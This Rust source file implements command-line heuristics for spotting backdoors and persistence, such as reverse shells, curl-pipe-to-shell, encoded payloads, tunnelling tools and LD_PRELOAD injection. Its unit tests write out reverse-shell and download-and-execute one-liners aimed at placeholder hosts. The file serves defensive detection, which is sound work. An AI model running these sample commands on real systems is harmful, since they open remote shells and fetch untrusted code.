//! Command-line heuristics for backdoors and trojans.
//!
//! This is not family detection. It captures the **behavioral primitives** that recur
//! when an intruder establishes persistence: reverse shells, download-and-execute, encoded payloads, tunnelling tools, anti-forensics, loader injection.
//! Every match is labeled heuristic and left for human judgement with context.

use crate::model::Severity;

#[derive(Debug, Clone)]
pub struct SignalHit {
    pub code: &'static str,
    pub severity: Severity,
    pub desc: &'static str,
    pub remedy: &'static str,
}

fn push(
    out: &mut Vec<SignalHit>,
    code: &'static str,
    severity: Severity,
    desc: &'static str,
    remedy: &'static str,
) {
    if !out.iter().any(|h| h.code == code) {
        out.push(SignalHit {
            code,
            severity,
            desc,
            remedy,
        });
    }
}

/// Analyze a command or config value (cron command, systemd ExecStart, shell rc line, plist arguments).
pub fn command_signals(cmd: &str) -> Vec<SignalHit> {
    let lower = cmd.to_ascii_lowercase();
    // Pad both sides so boundary patterns such as " -e " match correctly
    let l = format!(
        " {} ",
        lower.split_whitespace().collect::<Vec<_>>().join(" ")
    );
    let mut out = Vec::new();

    let has_curl = l.contains("curl ") || l.contains("wget ");
    let pipes_to_shell = l.contains("| sh")
        || l.contains("|sh")
        || l.contains("| bash")
        || l.contains("|bash")
        || l.contains("sh -c")
        || l.contains("bash -c");

    if l.contains("/dev/tcp/") {
        push(
            &mut out,
            "revshell-devtcp",
            Severity::Critical,
            "bash /dev/tcp reverse-shell pattern",
            "Remove the entry and check for outbound connections and processes",
        );
    }

    if (l.contains("nc ") || l.contains("netcat ") || l.contains("ncat "))
        && (l.contains(" -e ") || l.contains(" --exec "))
    {
        push(
            &mut out,
            "revshell-netcat",
            Severity::Critical,
            "netcat -e reverse shell",
            "Remove the entry; review outbound connections to that port",
        );
    }

    if l.contains("socat ") && l.contains("exec:") {
        push(
            &mut out,
            "revshell-socat",
            Severity::High,
            "socat exec reverse shell / tunnel",
            "Remove the entry; look for tunnel processes",
        );
    }

    if l.contains("bash -i") && (l.contains(">&") || l.contains("/dev/tcp")) {
        push(
            &mut out,
            "revshell-interactive",
            Severity::Critical,
            "Interactive shell redirection (classic reverse shell)",
            "Remove the entry; inspect the user session and network connections",
        );
    }

    if l.contains("base64")
        && (l.contains(" -d") || l.contains("--decode"))
        && (pipes_to_shell || l.contains("eval"))
    {
        push(
            &mut out,
            "encoded-payload",
            Severity::High,
            "base64-decoded payload execution",
            "Decode and inspect the payload; remove the entry",
        );
    }

    if has_curl && pipes_to_shell {
        push(
            &mut out,
            "curl-pipe-shell",
            Severity::High,
            "Download and execute a remote script",
            "Verify the source; production hosts should forbid this pattern",
        );
    }

    if has_curl && (l.contains("/tmp") || l.contains("/var/tmp") || l.contains("/dev/shm")) {
        push(
            &mut out,
            "download-to-tmp",
            Severity::Medium,
            "Download into a world-writable temp directory",
            "Verify the download source; temp directories should not hold executables",
        );
    }

    let tunnels = [
        "tmate",
        "ngrok",
        "chisel",
        "frpc",
        "frps ",
        "ligolo",
        "cloudflared tunnel",
        "bore ",
        "gost ",
        "venom",
    ];
    if tunnels.iter().any(|t| l.contains(t)) {
        push(
            &mut out,
            "tunnel-tool",
            Severity::High,
            "Suspected tunnelling / remote-control tool",
            "Confirm it is an approved admin channel; otherwise block and investigate",
        );
    }

    if l.contains("python")
        && l.contains(" -c")
        && (l.contains("socket") || l.contains("pty.spawn"))
    {
        push(
            &mut out,
            "inline-python",
            Severity::High,
            "Inline Python (common reverse-shell carrier)",
            "Review the script manually; remove the entry",
        );
    }

    if l.contains("perl ") && (l.contains("socket") || l.contains("io::socket")) {
        push(
            &mut out,
            "inline-perl",
            Severity::High,
            "Inline Perl socket script",
            "Review the script manually; remove the entry",
        );
    }

    if l.contains("history -c")
        || l.contains("unset histfile")
        || (l.contains(".bash_history") && l.contains("rm "))
    {
        push(
            &mut out,
            "anti-forensics",
            Severity::Medium,
            "Command-history wiping (anti-forensics)",
            "Correlate with audit logs; not conclusive on its own",
        );
    }

    if l.contains("ld_preload") {
        push(
            &mut out,
            "loader-inject",
            Severity::High,
            "LD_PRELOAD library injection",
            "Verify the preloaded library and its signature; remove suspicious config",
        );
    }

    if l.contains("openssl enc")
        && (l.contains(" -d") || l.contains("--decrypt") || l.contains("-base64"))
    {
        push(
            &mut out,
            "encrypted-payload",
            Severity::Medium,
            "Decoded/decrypted payload",
            "Decode manually and identify the key source",
        );
    }

    if l.contains("xxd -r")
        || l.contains("printf '\\x")
        || l.contains("echo -e '\\x")
        || l.contains("printf \"\\x")
    {
        push(
            &mut out,
            "hex-obfuscation",
            Severity::Medium,
            "Hex-obfuscated payload",
            "Reconstruct the payload before judging",
        );
    }

    if l.contains("chmod 777") || (l.contains("chmod +x") && l.contains("/tmp")) {
        push(
            &mut out,
            "chmod-writable",
            Severity::Medium,
            "Made a file in a writable directory executable",
            "Confirm the file purpose; executables in temp dirs are usually dropped payloads",
        );
    }

    out.sort_by_key(|h| std::cmp::Reverse(h.severity));
    out
}

/// Risk signals from the executable path itself.
pub fn path_signals(path: &str) -> Vec<SignalHit> {
    let p = path.to_ascii_lowercase();
    let mut out = Vec::new();
    if p.starts_with("/tmp/")
        || p.starts_with("/var/tmp/")
        || p.starts_with("/dev/shm/")
        || p.starts_with("/private/tmp/")
    {
        push(
            &mut out,
            "exec-from-tmp",
            Severity::High,
            "Executes from a world-writable temp directory",
            "Temp directories are not valid persistence paths; verify and remove",
        );
    } else if p.starts_with("/home/") || p.starts_with("/users/") || p.starts_with("/root/") {
        push(
            &mut out,
            "exec-from-home",
            Severity::Medium,
            "Executes from a user home directory (unusual for a system service)",
            "Confirm the service really needs to start from a home directory",
        );
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn codes(cmd: &str) -> Vec<&'static str> {
        command_signals(cmd).into_iter().map(|h| h.code).collect()
    }

    #[test]
    fn detects_reverse_shell() {
        assert!(codes("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1").contains(&"revshell-devtcp"));
        assert!(codes("nc -e /bin/sh 1.2.3.4 4444").contains(&"revshell-netcat"));
    }

    #[test]
    fn detects_download_exec() {
        assert!(codes("curl -fsSL http://x/y.sh | bash").contains(&"curl-pipe-shell"));
        assert!(codes("wget -qO- http://x | sh").contains(&"curl-pipe-shell"));
    }

    #[test]
    fn ignores_benign_commands() {
        assert!(codes("/usr/local/bin/backup --incremental").is_empty());
        assert!(codes("curl -fsSL https://example.com/api -o /var/lib/app/cache").is_empty());
    }

    #[test]
    fn path_signal_for_tmp() {
        assert!(!path_signals("/tmp/x").is_empty());
        assert!(path_signals("/usr/sbin/sshd").is_empty());
    }
}
